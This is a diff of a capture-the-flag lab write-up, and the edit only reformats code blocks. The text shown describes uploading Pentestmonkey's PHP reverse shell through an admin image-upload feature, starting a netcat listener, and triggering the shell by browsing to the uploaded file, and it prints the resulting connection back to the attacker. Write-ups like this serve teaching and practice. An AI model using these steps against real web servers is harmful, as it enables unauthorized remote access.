@@ -79,7 +79,9 @@ Going back to the website, we can see that the admin account is able to upload i
 First let's find out win which directory the image is being uploaded by checking the profile picture.
 It looks like it's located at *IP*/v2/profileimages.
 Let's grab the following reverse shell php from GitHub, shoutout to Pentestmonkey.
-```console https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php```
+```console
+https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+```
 Let's edit the file and replace the IP with ours, and then open a new terminal and run Netcat.
 ```console
 ┌─[zionglitch@parrot]─[~]
@@ -87,7 +89,9 @@ Let's edit the file and replace the IP with ours, and then open a new terminal a
 listening on [any] 1234 ...
 ```
 Now all we need to do is upload the php file on the Webpage and then go to the following link.
-```console http://10.10.184.168/v2/profileimages/phpreverseshell.php```
+```console
+http://10.10.184.168/v2/profileimages/phpreverseshell.php
+```
 And BAM!
 ```console 
 connect to [10.13.27.44] from (UNKNOWN) [10.10.184.168] 50762
